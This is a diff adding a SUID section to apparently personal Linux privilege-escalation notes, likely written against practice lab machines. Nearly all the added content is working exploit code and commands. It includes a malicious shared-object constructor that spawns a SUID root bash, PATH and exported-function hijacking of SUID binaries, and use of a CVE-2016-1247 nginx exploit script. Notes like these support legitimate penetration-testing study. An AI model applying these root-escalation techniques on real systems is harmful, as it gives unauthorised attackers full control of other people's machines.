@@ -177,6 +177,149 @@ cat /etc/sudoers
 
 ## SUID
 
+```shell
+#suid allows to execute file with permissions of specified user
+
+find / -perm -u=s -type f 2>/dev/null
+#find files with suid bit set
+#get exploit from GTFObins
+#run and get root
+```
+
+```shell
+#shared object injection
+
+#find files with suid bit set
+#check permissions
+ls -la /usr/local/bin/suid-so
+
+#run program
+/usr/local/bin/suid-so
+
+strace /usr/local/bin/suid-so 2>&1
+#attempt to debug
+
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+#browse through the .so files used for program
+#this mentions /home/user/.config/libcalc.so, we can check that
+
+ls -la /home/user/.config/libcalc.so
+#no such file or directory
+
+ls -la /home/user
+#.config folder does not exist
+
+#we can inject malicious .so file here
+
+vim libcalc.c
+#add exploit code
+
+mkdir .config
+
+gcc -shared -fPIC /home/user/libcalc.c -o /home/user/.config/libcalc.so
+
+/usr/local/bin/suid-so
+#running this gives us root
+#as we injected the so file
+```
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+```shell
+#binary symlinks
+
+#CVE-2016-1247
+
+dpkg -l | grep nginx
+#vulnerable if version < 1.6.2
+#and sudo has SUID bit
+
+find / -type f -perm -04000 -ls 2>/dev/null
+#find files with suid bit set
+#SUID bit set on sudo
+
+ls -la /var/log/nginx
+#we have rwx privileges in directory
+
+#get exploit for CVE-2016-1247
+./nginxed-root.sh /var/log/nginx/error.log
+#the exploit does everything for us
+#it will generate root shell when nginx is restarted
+#or if root user runs this command
+invoke-rc.d nginx rotate >/dev/null 2>&1
+
+#we get root shell
+```
+
+```shell
+#env variables
+
+env
+#view all env variables
+
+echo $PATH
+#view path variable
+
+find / -type f -perm -04000 -ls 2>/dev/null
+#find files with SUID bit set
+
+#check a vulnerable binary
+ls -la /usr/local/bin/suid-env
+
+/usr/local/bin/suid-env
+
+strings /usr/local/bin/suid-env
+#check for any other programs or binaries being referred
+#this program runs 'service apache2 start'
+
+#we can manipulate env variable
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+
+cat /tmp/service.c
+
+gcc /tmp/service.c -o /tmp/service
+
+export PATH=/tmp:$PATH
+
+echo $PATH
+#now, /tmp will be checked first for 'service' binary, before other directories
+
+/usr/local/bin/suid-env
+#run and get root
+```
+
+```shell
+#env variables
+ls -la /usr/local/bin/suid-env2
+#another binary with SUID bit set
+
+/usr/local/bin/suid-env2
+
+strings /usr/local/bin/suid-env2
+#this refers to a direct path
+#'/usr/sbin/service apache2 start'
+#unlike the previous binary
+
+#create malicious function
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+
+#export the function
+export -f /usr/sbin/service
+
+#run binary and get root
+/usr/sbin/service
+```
+
 ## Capabilities
 
 ## Scheduled Tasks
